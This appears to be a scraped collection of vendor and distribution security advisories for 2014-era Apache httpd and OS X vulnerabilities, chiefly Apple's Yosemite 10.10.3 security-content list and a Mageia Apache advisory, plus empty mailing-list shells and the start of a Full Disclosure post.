  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from lists.apache.org_6b8df184_20250125_143743.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_39d29e6a_20250125_143743.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_acbcfcfd_20250125_143744.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_616e103a_20250125_143742.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_319f42b6_20250125_143742.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from support.apple.com_a836c049_20250125_143745.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of OS X Yosemite v10.10.3 and Security Update 2015-004

This document describes the security content of OS X Yosemite v10.10.3 and Security Update 2015-004.

For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available. To learn more about Apple Product Security, see the [Apple Product Security](http://www.apple.com/support/security/) website.

For information about the Apple Product Security PGP Key, see [How to use the Apple Product Security PGP Key](http://support.apple.com/kb/HT1620).

Where possible, [CVE IDs](http://cve.mitre.org/about/) are used to reference the vulnerabilities for further information.

To learn about other Security Updates, see [Apple Security Updates](http://support.apple.com/kb/HT1222).

## OS X Yosemite v10.10.3 and Security Update 2015-004

* **Admin Framework**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A process may gain admin privileges without properly authenticating

  Description: An issue existed when checking XPC entitlements. This issue was addressed with improved entitlement checking.

  CVE-ID

  CVE-2015-1130 : Emil Kvarnhammar at TrueSec
* **apache**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Multiple vulnerabilities in Apache

  Description: Multiple vulnerabilities existed in Apache versions prior to 2.4.10 and 2.2.29, including one that may allow a remote attacker to execute arbitrary code. These issues were addressed by updating Apache to versions 2.4.10 and 2.2.29

  CVE-ID

  CVE-2013-5704

  CVE-2013-6438

  CVE-2014-0098

  CVE-2014-0117

  CVE-2014-0118

  CVE-2014-0226

  CVE-2014-0231

* **ATS**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with system privileges

  Description: Multiple input validation issues existed in fontd. These issues were addressed through improved input validation.

  CVE-ID

  CVE-2015-1131 : Ian Beer of Google Project Zero

  CVE-2015-1132 : Ian Beer of Google Project Zero

  CVE-2015-1133 : Ian Beer of Google Project Zero

  CVE-2015-1134 : Ian Beer of Google Project Zero

  CVE-2015-1135 : Ian Beer of Google Project Zero

* **Certificate Trust Policy**

  Impact: Update to the certificate trust policy

  Description: The certificate trust policy was updated. View the [complete list of certificates](https://support.apple.com/en-us/HT202858).

* **CFNetwork HTTPProtocol**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Cookies belonging to one origin may be sent to another origin

  Description: A cross-domain cookie issue existed in redirect handling. Cookies set in a redirect response could be passed on to a redirect target belonging to another origin. The issue was address through improved handling of redirects.

  CVE-ID

  CVE-2015-1089 : Niklas Keller (http://kelunik.com)

* **CFNetwork Session**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Authentication credentials may be sent to a server on another origin

  Description: A cross-domain HTTP request headers issue existed in redirect handling. HTTP request headers sent in a redirect response could be passed on to another origin. The issue was addressed through improved handling of redirects.

  CVE-ID

  CVE-2015-1091 : Diego Torres (http://dtorres.me)

* **CFURL**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Visiting a maliciously crafted website may lead to arbitrary code execution

  Description: An input validation issue existed within URL processing. This issue was addressed through improved URL validation.

  CVE-ID

  CVE-2015-1088 : Luigi Galli

* **CoreAnimation**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Visiting a maliciously crafted website may lead to arbitrary code execution

  Description: A use-after-free issue existed in CoreAnimation. This issue was addressed through improved mutex management.

  CVE-ID

  CVE-2015-1136 : Apple

* **CUPS**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with root privileges

  Description: A use after free issue existed in how CUPS handled IPP messages. This issue was addressed through improved reference counting.

  CVE-ID

  CVE-2015-1158 : Neel Mehta of Google

* **CUPS**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: In certain configurations, a remote attacker may be able to submit arbitrary print jobs

  Description: A cross-site scripting issue existed in the CUPS web interface. This issue was addressed through improved output sanitization.

  CVE-ID

  CVE-2015-1159 : Neel Mehta of Google

* **FontParser**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

  Description: Multiple memory corruption issues existed in the processing of font files. These issues were addressed through improved bounds checking.

  CVE-ID

  CVE-2015-1093 : Marc Schoenefeld

* **Graphics Driver**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with system privileges

  Description: A NULL pointer dereference existed in NVIDIA graphics driver's handling of certain IOService userclient types. This issue was addressed through additional context validation.

  CVE-ID

  CVE-2015-1137 : Frank Graziano and John Villamil of the Yahoo Pentest Team

* **Hypervisor**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A local application may be able to cause a denial of service

  Description: An input validation issue existed in the hypervisor framework. This issue was addressed through improved input validation.

  CVE-ID

  CVE-2015-1138 : Izik Eidus and Alex Fishman

* **ImageIO**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Processing a maliciously crafted .sgi file may lead to arbitrary code execution

  Description: A memory corruption issue existed in the handling of .sgi files. This issue was addressed through improved bounds checking.

  CVE-ID

  CVE-2015-1139 : Apple

* **IOHIDFamily**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A malicious HID device may be able to cause arbitrary code execution

  Description: A memory corruption issue existed in an IOHIDFamily API. This issue was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1095 : Andrew Church
* **IOHIDFamily**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with system privileges

  Description: A buffer overflow issue existed in IOHIDFamily. This issue was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1140 : lokihardt@ASRT working with HP's Zero Day Initiative, Luca Todesco, Vitaliy Toropov working with HP's Zero Day Initiative (ZDI)
* **IOHIDFamily**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to determine kernel memory layout

  Description: An issue existed in IOHIDFamily that led to the disclosure of kernel memory content. This issue was addressed through improved bounds checking.

  CVE-ID

  CVE-2015-1096 : Ilja van Sprundel of IOActive
* **IOHIDFamily**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5

  Impact: A malicious application may be able to execute arbitrary code with system privileges

  Description: A heap buffer overflow existed in IOHIDFamily's handling of key-mapping properties. This issue was addressed through improved bounds checking.

  CVE-ID

  CVE-2014-4404 : Ian Beer of Google Project Zero
* **IOHIDFamily**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5

  Impact: A malicious application may be able to execute arbitrary code with system privileges

  Description: A null pointer dereference existed in IOHIDFamily's handling of key-mapping properties. This issue was addressed through improved validation of IOHIDFamily key-mapping properties.

  CVE-ID

  CVE-2014-4405 : Ian Beer of Google Project Zero
* **IOHIDFamily**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5

  Impact: A user may be able to execute arbitrary code with system privileges

  Description: An out-of-bounds write issue exited in the IOHIDFamily driver. The issue was addressed through improved input validation.

  CVE-ID

  CVE-2014-4380 : cunzhang from Adlab of Venustech
* **Kernel**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to cause unexpected system shutdown

  Description: An issue existed in the handling of virtual memory operations within the kernel. The issue is fixed through improved handling of the mach\_vm\_read operation.

  CVE-ID

  CVE-2015-1141 : Ole Andre Vadla Ravnas of www.frida.re
* **Kernel**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to cause a system denial of service

  Description: A race condition existed in the kernel's setreuid system call. This issue was addressed through improved state management.

  CVE-ID

  CVE-2015-1099 : Mark Mentovai of Google Inc.
* **Kernel**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local application may escalate privileges using a compromised service intended to run with reduced privileges

  Description: setreuid and setregid system calls failed to drop privileges permanently. This issue was addressed by correctly dropping privileges.

  CVE-ID

  CVE-2015-1117 : Mark Mentovai of Google Inc.
* **Kernel**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: An attacker with a privileged network position may be able to redirect user traffic to arbitrary hosts

  Description: ICMP redirects were enabled by default on OS X. This issue was addressed by disabling ICMP redirects.

  CVE-ID

  CVE-2015-1103 : Zimperium Mobile Security Labs
* **Kernel**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: An attacker with a privileged network position may be able to cause a denial of service

  Description: A state inconsistency existed in the processing of TCP headers. This issue was addressed through improved state handling.

  CVE-ID

  CVE-2015-1102 : Andrey Khudyakov and Maxim Zhuravlev of Kaspersky Lab
* **Kernel**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to cause unexpected system termination or read kernel memory

  Description: A out of bounds memory access issue existed in the kernel. This issue was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1100 : Maxime Villard of m00nbsd
* **Kernel**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A remote attacker may be able to bypass network filters

  Description: The system would treat some IPv6 packets from remote network interfaces as local packets. The issue was addressed by rejecting these packets.

  CVE-ID

  CVE-2015-1104 : Stephen Roettger of the Google Security Team
* **Kernel**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with kernel privileges

  Description: A memory corruption issue existed in the kernel. This issue was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1101 : lokihardt@ASRT working with HP's Zero Day Initiative
* **Kernel**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A remote attacker may be able to cause a denial of service

  Description: A state inconsistency issue existed in the handling of TCP out of band data. This issue was addressed through improved state management.

  CVE-ID

  CVE-2015-1105 : Kenton Varda of Sandstorm.io
* **LaunchServices**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to cause the Finder to crash

  Description: An input validation issue existed in LaunchServices's handling of application localization data. This issue was addressed through improved validation of localization data.

  CVE-ID

  CVE-2015-1142
* **LaunchServices**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with system privileges

  Description: A type confusion issue existed in LaunchServices's handling of localized strings. This issue was addressed through additional bounds checking.

  CVE-ID

  CVE-2015-1143 : Apple
* **libnetcore**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Processing a maliciously crafted configuration profile may lead to unexpected application termination

  Description: A memory corruption issue existed in the handling of configuration profiles. This issue was addressed through improved bounds checking.

  CVE-ID

  CVE-2015-1118 : Zhaofeng Chen, Hui Xue, Yulong Zhang, and Tao Wei of FireEye, Inc.
* **ntp**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A remote attacker may brute force ntpd authentication keys

  Description: The config\_auth function in ntpd generated a weak key when an authentication key was not configured. This issue was addressed by improved key generation.

  CVE-ID

  CVE-2014-9298
* **OpenLDAP**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A remote unauthenticated client may be able to cause a denial of service

  Description: Multiple input validation issues existed in OpenLDAP. These issues were addressed by improved input validation.

  CVE-ID

  CVE-2015-1545 : Ryan Tandy

  CVE-2015-1546 : Ryan Tandy
* **OpenSSL**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Multiple vulnerabilities in OpenSSL

  Description: Multiple vulnerabilities existed in OpenSSL 0.9.8zc, including one that may allow an attacker to intercept connections to a server that supports export-grade ciphers. These issues were addressed by updating OpenSSL to version 0.9.8zd.

  CVE-ID

  CVE-2014-3569

  CVE-2014-3570

  CVE-2014-3571

  CVE-2014-3572

  CVE-2014-8275

  CVE-2015-0204
* **Open Directory Client**

  Available for: OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A password might be sent unencrypted over the network when using Open Directory from OS X Server

  Description: If an Open Directory client was bound to an OS X Server but did not install the certificates of the OS X Server, and then a user on that client changed their password, the password change request was sent over the network without encryption. This issue was addressed by having the client require encryption for this case.

  CVE-ID

  CVE-2015-1147 : Apple
* **PHP**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Multiple vulnerabilities in PHP

  Description: Multiple vulnerabilities existed in PHP versions prior to 5.3.29, 5.4.38, and 5.5.20, including one which may have led to arbitrary code execution. This update addresses the issues by updating PHP to versions 5.3.29, 5.4.38, and 5.5.20.

  CVE-ID

  CVE-2013-6712

  CVE-2014-0207

  CVE-2014-0237

  CVE-2014-0238

  CVE-2014-2497

  CVE-2014-3478

  CVE-2014-3479

  CVE-2014-3480

  CVE-2014-3487

  CVE-2014-3538

  CVE-2014-3587

  CVE-2014-3597

  CVE-2014-3668

  CVE-2014-3669

  CVE-2014-3670

  CVE-2014-3710

  CVE-2014-3981

  CVE-2014-4049

  CVE-2014-4670

  CVE-2014-4698

  CVE-2014-5120

**QuickLook**

* Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Opening a maliciously crafted iWork file may lead to arbitrary code execution

  Description: A memory corruption issue existed in the handling of iWork files. This issue was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1098 : Christopher Hickstein
* **SceneKit**

  Available for: OS X Mountain Lion v10.8.5

  Impact: Viewing a maliciously crafted Collada file may lead to arbitrary code execution

  Description: A heap buffer overflow existed in SceneKit's handling of Collada files. Viewing a maliciously crafted Collada file may have led to arbitrary code execution. This issue was addressed through improved validation of accessor elements.

  CVE-ID

  CVE-2014-8830 : Jose Duart of Google Security Team
* **Screen Sharing**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: A user's password may be logged to a local file

  Description: In some circumstances, Screen Sharing may log a user's password that is not readable by other users on the system. This issue was addressed by removing logging of credential.

  CVE-ID

  CVE-2015-1148 : Apple
* **Secure Transport**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Processing a maliciously crafted X.509 certificate may lead to unexpected application termination

  Description: A NULL pointer dereference issue existed in the handling of X.509 certificates. This issue was addressed through improved input validation.

  CVE-ID

  CVE-2015-1160 : Elisha Eshed, Roy Iarchy, and Yair Amit of Skycure Security Research
* **Security - Code Signing**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: Tampered applications may not be prevented from launching

  Description: Applications containing specially crafted bundles may have been able to launch without a completely valid signature. This issue was addressed by adding additional checks.

  CVE-ID

  CVE-2015-1145

  CVE-2015-1146
* **UniformTypeIdentifiers**

  Available for: OS X Mountain Lion v10.8.5, OS X Mavericks v10.9.5, OS X Yosemite v10.10 to v10.10.2

  Impact: A local user may be able to execute arbitrary code with system privileges

  Description: A buffer overflow existed in the way Uniform Type Identifiers were handled. This issue was addressed with improved bounds checking.

  CVE-ID

  CVE-2015-1144 : Apple
* **WebKit**

  Available for: OS X Yosemite v10.10 to v10.10.2

  Impact: Visiting a maliciously crafted website may lead to arbitrary code execution

  Description: A memory corruption issue existed in WebKit. This issues was addressed through improved memory handling.

  CVE-ID

  CVE-2015-1069 : lokihardt@ASRT working with HP's Zero Day Initiative

Security Update 2015-004 (available for OS X Mountain Lion v10.8.5 and OS X Mavericks v10.9.5) also addresses an issue caused by the fix for CVE-2015-1067 in Security Update 2015-002. This issue prevented Remote Apple Events clients on any version from connecting to the Remote Apple Events server. In default configurations, Remote Apple Events is not enabled.

OS X Yosemite v10.10.3 includes the [security content of Safari 8.0.5](https://support.apple.com/en-us/HT204658).

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: December 06, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of OS X Yosemite v10.10.3 and Security Update 2015-004

[United States](https://support.apple.com/en-us/103484/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from lists.apache.org_a805a856_20250125_143743.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from advisories.mageia.org_eb3f6aa2_20250125_143702.html ===

# [Advisories](index.html) » MGASA-2014-0305

## Updated apache package fixes security vulnerabilities

Publication date: 29 Jul 2014

Modification date: 22 Jan 2022

Type: security

Affected Mageia releases :
[4](4.html)

CVE:
[CVE-2014-0117](CVE-2014-0117.html)
,
[CVE-2014-0118](CVE-2014-0118.html)
,
[CVE-2014-0226](CVE-2014-0226.html)
,
[CVE-2014-0231](CVE-2014-0231.html)

## Description

```
A race condition flaw, leading to heap-based buffer overflows, was found in
the mod_status httpd module. A remote attacker able to access a status page
served by mod_status on a server using a threaded Multi-Processing Module
(MPM) could send a specially crafted request that would cause the httpd
child process to crash or, possibly, allow the attacker to execute
arbitrary code with the privileges of the "apache" user (CVE-2014-0226).

A denial of service flaw was found in the mod_proxy httpd module. A remote
attacker could send a specially crafted request to a server configured as a
reverse proxy using a threaded Multi-Processing Modules (MPM) that would
cause the httpd child process to crash (CVE-2014-0117).

A denial of service flaw was found in the way httpd's mod_deflate module
handled request body decompression (configured via the "DEFLATE" input
filter). A remote attacker able to send a request whose body would be
decompressed could use this flaw to consume an excessive amount of system
memory and CPU on the target system (CVE-2014-0118).

A denial of service flaw was found in the way httpd's mod_cgid module
executed CGI scripts that did not read data from the standard input.
A remote attacker could submit a specially crafted request that would cause
the httpd child process to hang indefinitely (CVE-2014-0231).

```

## References

* <https://bugs.mageia.org/show_bug.cgi?id=13788>
* <http://httpd.apache.org/security/vulnerabilities_24.html>
* <https://rhn.redhat.com/errata/RHSA-2014-0921.html>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0117>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0118>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0226>
* <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0231>

## SRPMS

### 4/core

* apache-2.4.7-5.3.mga4



=== Content from seclists.org_d8c0e402_20250125_143712.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](116)
[By Date](date.html#117)
[![Next](/images/right-icon-16x16.png)](118)

[![Previous](/images/left-icon-16x16.png)](114)
[By Thread](index.html#117)
[![Next](/images/right-icon-16x16.png)](118)

![](/shared/images/nst-icons.svg#search)

# Apache HTTPd - description of the CVE-2014-0117.

---

*From*: funky.koval () hushmail com

*Date*: Mon, 21 Jul 2014 16:47:49 +0000

---

```
Hi there,

Software: apache httpd 2.4.7 , possibly others from 2.3 and 2.4
